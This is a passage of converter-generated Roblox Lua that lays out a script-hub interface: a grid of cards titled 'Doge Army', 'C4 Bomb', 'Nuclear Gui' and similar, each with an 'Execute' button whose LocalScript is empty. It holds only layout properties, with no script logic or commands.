G2L["3c"] = Instance.new("Frame", G2L["2b"]);
G2L["3c"]["BorderSizePixel"] = 0;
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["3c"]["Size"] = UDim2.new(0, 174, 0, 176);
G2L["3c"]["Position"] = UDim2.new(-0, 0, 0.13677, 0);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.UIStroke
G2L["3d"] = Instance.new("UIStroke", G2L["3c"]);
G2L["3d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3d"]["Thickness"] = 1.3;
G2L["3d"]["Color"] = Color3.fromRGB(233, 118, 36);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel
G2L["3e"] = Instance.new("ImageLabel", G2L["3c"]);
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3e"]["Image"] = [[rbxassetid://98893207641774]];
G2L["3e"]["Size"] = UDim2.new(0, 174, 0, 141);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["BackgroundTransparency"] = 1;
G2L["3e"]["Position"] = UDim2.new(-0, 0, -0.01219, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["3f"] = Instance.new("UIGradient", G2L["3e"]);
G2L["3f"]["Rotation"] = 90;
G2L["3f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton
G2L["40"] = Instance.new("TextButton", G2L["3c"]);
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["TextSize"] = 22;
G2L["40"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(149, 72, 25);
G2L["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["40"]["Size"] = UDim2.new(0.11717, 121, 0.03039, 24);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["Text"] = [[Execute]];
G2L["40"]["Position"] = UDim2.new(0.09054, 0, 0.76078, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["41"] = Instance.new("LocalScript", G2L["40"]);



-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextLabel
G2L["42"] = Instance.new("TextLabel", G2L["3c"]);
G2L["42"]["BorderSizePixel"] = 0;
G2L["42"]["TextSize"] = 32;
G2L["42"]["TextTransparency"] = 0.49;
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["42"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["BackgroundTransparency"] = 1;
G2L["42"]["Size"] = UDim2.new(0, 129, 0, 21);
G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["Text"] = [[Doge Army]];
G2L["42"]["Position"] = UDim2.new(0.12029, 0, 0.05274, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just
G2L["43"] = Instance.new("Frame", G2L["2b"]);
G2L["43"]["BorderSizePixel"] = 0;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["43"]["Size"] = UDim2.new(0, 174, 0, 176);
G2L["43"]["Position"] = UDim2.new(0.48071, 0, 0.13677, 0);
G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.UIStroke
G2L["44"] = Instance.new("UIStroke", G2L["43"]);
G2L["44"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["44"]["Thickness"] = 1.3;
G2L["44"]["Color"] = Color3.fromRGB(233, 118, 36);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel
G2L["45"] = Instance.new("ImageLabel", G2L["43"]);
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["45"]["Image"] = [[rbxassetid://112198609303505]];
G2L["45"]["Size"] = UDim2.new(0, 174, 0, 141);
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["BackgroundTransparency"] = 1;
G2L["45"]["Position"] = UDim2.new(0.0067, 0, -0.01219, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["46"] = Instance.new("UIGradient", G2L["45"]);
G2L["46"]["Rotation"] = 90;
G2L["46"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton
G2L["47"] = Instance.new("TextButton", G2L["43"]);
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["TextSize"] = 22;
G2L["47"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(149, 72, 25);
G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["47"]["Size"] = UDim2.new(0.11717, 121, 0.03039, 24);
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Text"] = [[Execute]];
G2L["47"]["Position"] = UDim2.new(0.09724, 0, 0.76078, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["48"] = Instance.new("LocalScript", G2L["47"]);



-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextLabel
G2L["49"] = Instance.new("TextLabel", G2L["43"]);
G2L["49"]["BorderSizePixel"] = 0;
G2L["49"]["TextSize"] = 32;
G2L["49"]["TextTransparency"] = 0.49;
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["49"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["BackgroundTransparency"] = 1;
G2L["49"]["Size"] = UDim2.new(0, 129, 0, 21);
G2L["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49"]["Text"] = [[Dark Vex]];
G2L["49"]["Position"] = UDim2.new(0.12699, 0, 0.05274, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just
G2L["4a"] = Instance.new("Frame", G2L["2b"]);
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["4a"]["Size"] = UDim2.new(0, 174, 0, 176);
G2L["4a"]["Position"] = UDim2.new(0.48071, 0, 0.2755, 0);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.UIStroke
G2L["4b"] = Instance.new("UIStroke", G2L["4a"]);
G2L["4b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4b"]["Thickness"] = 1.3;
G2L["4b"]["Color"] = Color3.fromRGB(233, 118, 36);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel
G2L["4c"] = Instance.new("ImageLabel", G2L["4a"]);
G2L["4c"]["BorderSizePixel"] = 0;
G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4c"]["Image"] = [[rbxassetid://138885605652898]];
G2L["4c"]["Size"] = UDim2.new(0, 174, 0, 141);
G2L["4c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c"]["BackgroundTransparency"] = 1;
G2L["4c"]["Position"] = UDim2.new(0.0067, 0, -0.00973, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["4d"] = Instance.new("UIGradient", G2L["4c"]);
G2L["4d"]["Rotation"] = 90;
G2L["4d"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton
G2L["4e"] = Instance.new("TextButton", G2L["4a"]);
G2L["4e"]["BorderSizePixel"] = 0;
G2L["4e"]["TextSize"] = 22;
G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(149, 72, 25);
G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e"]["Size"] = UDim2.new(0.11717, 121, 0.03039, 24);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["Text"] = [[Execute]];
G2L["4e"]["Position"] = UDim2.new(0.09724, 0, 0.76323, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["4f"] = Instance.new("LocalScript", G2L["4e"]);



-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextLabel
G2L["50"] = Instance.new("TextLabel", G2L["4a"]);
G2L["50"]["BorderSizePixel"] = 0;
G2L["50"]["TextSize"] = 32;
G2L["50"]["TextTransparency"] = 0.49;
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["50"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["BackgroundTransparency"] = 1;
G2L["50"]["Size"] = UDim2.new(0, 129, 0, 21);
G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["Text"] = [[C4 Bomb]];
G2L["50"]["Position"] = UDim2.new(0.12699, 0, 0.05519, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just
G2L["51"] = Instance.new("Frame", G2L["2b"]);
G2L["51"]["BorderSizePixel"] = 0;
G2L["51"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["51"]["Size"] = UDim2.new(0, 174, 0, 176);
G2L["51"]["Position"] = UDim2.new(-0, 0, 0.41423, 0);
G2L["51"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.UIStroke
G2L["52"] = Instance.new("UIStroke", G2L["51"]);
G2L["52"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["52"]["Thickness"] = 1.3;
G2L["52"]["Color"] = Color3.fromRGB(233, 118, 36);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel
G2L["53"] = Instance.new("ImageLabel", G2L["51"]);
G2L["53"]["BorderSizePixel"] = 0;
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["53"]["Image"] = [[rbxassetid://115530999244225]];
G2L["53"]["Size"] = UDim2.new(0, 174, 0, 141);
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["BackgroundTransparency"] = 1;
G2L["53"]["Position"] = UDim2.new(-0, 0, -0.00728, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["54"] = Instance.new("UIGradient", G2L["53"]);
G2L["54"]["Rotation"] = 90;
G2L["54"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton
G2L["55"] = Instance.new("TextButton", G2L["51"]);
G2L["55"]["BorderSizePixel"] = 0;
G2L["55"]["TextSize"] = 22;
G2L["55"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(149, 72, 25);
G2L["55"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["55"]["Size"] = UDim2.new(0.11717, 121, 0.03039, 24);
G2L["55"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["55"]["Text"] = [[Execute]];
G2L["55"]["Position"] = UDim2.new(0.09054, 0, 0.76569, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["56"] = Instance.new("LocalScript", G2L["55"]);



-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextLabel
G2L["57"] = Instance.new("TextLabel", G2L["51"]);
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["TextSize"] = 32;
G2L["57"]["TextTransparency"] = 0.49;
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["57"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["BackgroundTransparency"] = 1;
G2L["57"]["Size"] = UDim2.new(0, 129, 0, 21);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Text"] = [[F3x Tools]];
G2L["57"]["Position"] = UDim2.new(0.12029, 0, 0.05765, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just
G2L["58"] = Instance.new("Frame", G2L["2b"]);
G2L["58"]["BorderSizePixel"] = 0;
G2L["58"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["58"]["Size"] = UDim2.new(0, 174, 0, 176);
G2L["58"]["Position"] = UDim2.new(0.48071, 0, 0.41423, 0);
G2L["58"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["58"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.UIStroke
G2L["59"] = Instance.new("UIStroke", G2L["58"]);
G2L["59"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["59"]["Thickness"] = 1.3;
G2L["59"]["Color"] = Color3.fromRGB(233, 118, 36);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel
G2L["5a"] = Instance.new("ImageLabel", G2L["58"]);
G2L["5a"]["BorderSizePixel"] = 0;
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["5a"]["Image"] = [[rbxassetid://99949640024663]];
G2L["5a"]["Size"] = UDim2.new(0, 174, 0, 141);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5a"]["BackgroundTransparency"] = 1;
G2L["5a"]["Position"] = UDim2.new(0.0067, 0, -0.00728, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["5b"] = Instance.new("UIGradient", G2L["5a"]);
G2L["5b"]["Rotation"] = 90;
G2L["5b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton
G2L["5c"] = Instance.new("TextButton", G2L["58"]);
G2L["5c"]["BorderSizePixel"] = 0;
G2L["5c"]["TextSize"] = 22;
G2L["5c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(149, 72, 25);
G2L["5c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5c"]["Size"] = UDim2.new(0.11717, 121, 0.03039, 24);
G2L["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["Text"] = [[Execute]];
G2L["5c"]["Position"] = UDim2.new(0.09724, 0, 0.76569, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["5d"] = Instance.new("LocalScript", G2L["5c"]);



-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextLabel
G2L["5e"] = Instance.new("TextLabel", G2L["58"]);
G2L["5e"]["BorderSizePixel"] = 0;
G2L["5e"]["TextSize"] = 32;
G2L["5e"]["TextTransparency"] = 0.49;
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["BackgroundTransparency"] = 1;
G2L["5e"]["Size"] = UDim2.new(0, 129, 0, 21);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["Text"] = [[Death Sherif]];
G2L["5e"]["Position"] = UDim2.new(0.12699, 0, 0.05765, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just
G2L["5f"] = Instance.new("Frame", G2L["2b"]);
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["5f"]["Size"] = UDim2.new(0, 174, 0, 176);
G2L["5f"]["Position"] = UDim2.new(-0, 0, 0.55297, 0);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.UIStroke
G2L["60"] = Instance.new("UIStroke", G2L["5f"]);
G2L["60"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["60"]["Thickness"] = 1.3;
G2L["60"]["Color"] = Color3.fromRGB(233, 118, 36);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel
G2L["61"] = Instance.new("ImageLabel", G2L["5f"]);
G2L["61"]["BorderSizePixel"] = 0;
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["61"]["Image"] = [[rbxassetid://115440600346929]];
G2L["61"]["Size"] = UDim2.new(0, 174, 0, 141);
G2L["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["BackgroundTransparency"] = 1;
G2L["61"]["Position"] = UDim2.new(-0, 0, -0.00483, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["62"] = Instance.new("UIGradient", G2L["61"]);
G2L["62"]["Rotation"] = 90;
G2L["62"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton
G2L["63"] = Instance.new("TextButton", G2L["5f"]);
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["TextSize"] = 22;
G2L["63"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(149, 72, 25);
G2L["63"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["63"]["Size"] = UDim2.new(0.11717, 121, 0.03039, 24);
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Text"] = [[Execute]];
G2L["63"]["Position"] = UDim2.new(0.09054, 0, 0.76814, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["64"] = Instance.new("LocalScript", G2L["63"]);



-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextLabel
G2L["65"] = Instance.new("TextLabel", G2L["5f"]);
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["TextSize"] = 32;
G2L["65"]["TextTransparency"] = 0.49;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["65"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["BackgroundTransparency"] = 1;
G2L["65"]["Size"] = UDim2.new(0, 129, 0, 21);
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Text"] = [[The Defiant]];
G2L["65"]["Position"] = UDim2.new(0.12029, 0, 0.0601, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just
G2L["66"] = Instance.new("Frame", G2L["2b"]);
G2L["66"]["BorderSizePixel"] = 0;
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["66"]["Size"] = UDim2.new(0, 174, 0, 176);
G2L["66"]["Position"] = UDim2.new(0.48071, 0, 0.55297, 0);
G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.UIStroke
G2L["67"] = Instance.new("UIStroke", G2L["66"]);
G2L["67"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["67"]["Thickness"] = 1.3;
G2L["67"]["Color"] = Color3.fromRGB(233, 118, 36);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel
G2L["68"] = Instance.new("ImageLabel", G2L["66"]);
G2L["68"]["BorderSizePixel"] = 0;
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["68"]["Image"] = [[rbxassetid://77063341160612]];
G2L["68"]["Size"] = UDim2.new(0, 174, 0, 141);
G2L["68"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["BackgroundTransparency"] = 1;
G2L["68"]["Position"] = UDim2.new(0.0067, 0, -0.00483, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["69"] = Instance.new("UIGradient", G2L["68"]);
G2L["69"]["Rotation"] = 90;
G2L["69"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton
G2L["6a"] = Instance.new("TextButton", G2L["66"]);
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["TextSize"] = 22;
G2L["6a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(149, 72, 25);
G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6a"]["Size"] = UDim2.new(0.11717, 121, 0.03039, 24);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["Text"] = [[Execute]];
G2L["6a"]["Position"] = UDim2.new(0.09724, 0, 0.76814, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["6b"] = Instance.new("LocalScript", G2L["6a"]);



-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextLabel
G2L["6c"] = Instance.new("TextLabel", G2L["66"]);
G2L["6c"]["BorderSizePixel"] = 0;
G2L["6c"]["TextSize"] = 32;
G2L["6c"]["TextTransparency"] = 0.49;
G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["BackgroundTransparency"] = 1;
G2L["6c"]["Size"] = UDim2.new(0, 129, 0, 21);
G2L["6c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6c"]["Text"] = [[Nuclear Gui]];
G2L["6c"]["Position"] = UDim2.new(0.12699, 0, 0.0601, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just
G2L["6d"] = Instance.new("Frame", G2L["2b"]);
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["6d"]["Size"] = UDim2.new(0, 174, 0, 176);
G2L["6d"]["Position"] = UDim2.new(-0, 0, 0.6917, 0);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel
G2L["6e"] = Instance.new("ImageLabel", G2L["6d"]);
G2L["6e"]["BorderSizePixel"] = 0;
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["6e"]["Image"] = [[rbxassetid://132987071478963]];
G2L["6e"]["Size"] = UDim2.new(0, 174, 0, 141);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["BackgroundTransparency"] = 1;
G2L["6e"]["Position"] = UDim2.new(-0, 0, -0.00237, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["6f"] = Instance.new("UIGradient", G2L["6e"]);
G2L["6f"]["Rotation"] = 90;
G2L["6f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton
G2L["70"] = Instance.new("TextButton", G2L["6d"]);
G2L["70"]["BorderSizePixel"] = 0;
G2L["70"]["TextSize"] = 22;
G2L["70"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(149, 72, 25);
G2L["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["70"]["Size"] = UDim2.new(0.11717, 121, 0.03039, 24);
G2L["70"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["70"]["Text"] = [[Execute]];
G2L["70"]["Position"] = UDim2.new(0.09054, 0, 0.77059, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["71"] = Instance.new("LocalScript", G2L["70"]);



-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextLabel
G2L["72"] = Instance.new("TextLabel", G2L["6d"]);
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["TextSize"] = 32;
G2L["72"]["TextTransparency"] = 0.49;
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["72"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["BackgroundTransparency"] = 1;
G2L["72"]["Size"] = UDim2.new(0, 129, 0, 21);
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Text"] = [[Police AI]];
G2L["72"]["Position"] = UDim2.new(0.12029, 0, 0.06255, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.UIStroke
G2L["73"] = Instance.new("UIStroke", G2L["6d"]);
G2L["73"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["73"]["Thickness"] = 1.3;
G2L["73"]["Color"] = Color3.fromRGB(149, 72, 25);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just
G2L["74"] = Instance.new("Frame", G2L["2b"]);
G2L["74"]["BorderSizePixel"] = 0;
G2L["74"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["74"]["Size"] = UDim2.new(0, 174, 0, 176);
